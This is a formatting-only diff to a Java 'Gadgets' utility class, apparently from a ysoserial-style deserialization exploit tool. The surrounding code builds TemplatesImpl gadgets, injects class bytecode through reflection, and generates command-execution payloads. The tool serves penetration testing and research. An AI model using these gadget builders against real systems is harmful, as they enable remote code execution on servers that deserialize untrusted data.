@@ -10,18 +10,20 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
 import java.io.Serializable;
 import java.lang.reflect.*;
 import java.util.HashMap;
 import java.util.Map;
+
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 
 /*
  * utility generator functions for common jdk-only gadgets
  */
-@SuppressWarnings ( {
+@SuppressWarnings({
         "restriction", "rawtypes", "unchecked"
-} )
+})
 public class Gadgets {
 
     static {
@@ -39,11 +41,13 @@ public class Gadgets {
         private static final long serialVersionUID = -5971610431559700674L;
 
 
-        public void transform ( DOM document, SerializationHandler[] handlers ) throws TransletException {}
+        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+        }
 
 
         @Override
-        public void transform ( DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
+        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+        }
     }
 
     // required to make TemplatesImpl happy
@@ -53,35 +57,35 @@ public class Gadgets {
     }
 
 
-    public static <T> T createMemoitizedProxy ( final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
+    public static <T> T createMemoitizedProxy(final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces) throws Exception {
         return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
     }
 
 
-    public static InvocationHandler createMemoizedInvocationHandler ( final Map<String, Object> map ) throws Exception {
+    public static InvocationHandler createMemoizedInvocationHandler(final Map<String, Object> map) throws Exception {
         return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
     }
 
 
-    public static <T> T createProxy ( final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
+    public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces) {
         final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
-        allIfaces[ 0 ] = iface;
-        if ( ifaces.length > 0 ) {
+        allIfaces[0] = iface;
+        if (ifaces.length > 0) {
             System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
         }
         return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
     }
 
 
-    public static Map<String, Object> createMap ( final String key, final Object val ) {
+    public static Map<String, Object> createMap(final String key, final Object val) {
         final Map<String, Object> map = new HashMap<String, Object>();
         map.put(key, val);
         return map;
     }
 
 
-    public static Object createTemplatesImpl (PayloadType type, String... param) throws Exception {
-        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
+    public static Object createTemplatesImpl(PayloadType type, String... param) throws Exception {
+        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
             return createTemplatesImpl(
                     type,
                     Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
@@ -93,8 +97,7 @@ public class Gadgets {
         return createTemplatesImpl(type, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class, param);
     }
 
-
-    public static <T> T createTemplatesImpl (PayloadType type, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory, String... param)
+    public static <T> T createTemplatesImpl(PayloadType type, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory, String... param)
             throws Exception {
         final T templates = tplClass.newInstance();
 
@@ -115,7 +118,7 @@ public class Gadgets {
 //        clazz.setSuperclass(superC);
 
         byte[] classBytes = null;
-        switch (type){
+        switch (type) {
             case command:
                 CommandTemplate commandTemplate = new CommandTemplate(param[0]);
                 classBytes = commandTemplate.getBytes();
@@ -164,7 +167,7 @@ public class Gadgets {
         }
 
         // inject class bytes into instance
-        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
                 classBytes, ClassFiles.classAsBytes(Foo.class)
         });
 
@@ -182,8 +185,7 @@ public class Gadgets {
         Class nodeC;
         try {
             nodeC = Class.forName("java.util.HashMap$Node");
-        }
-        catch ( ClassNotFoundException e ) {
+        } catch (ClassNotFoundException e) {
             nodeC = Class.forName("java.util.HashMap$Entry");
         }
         Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
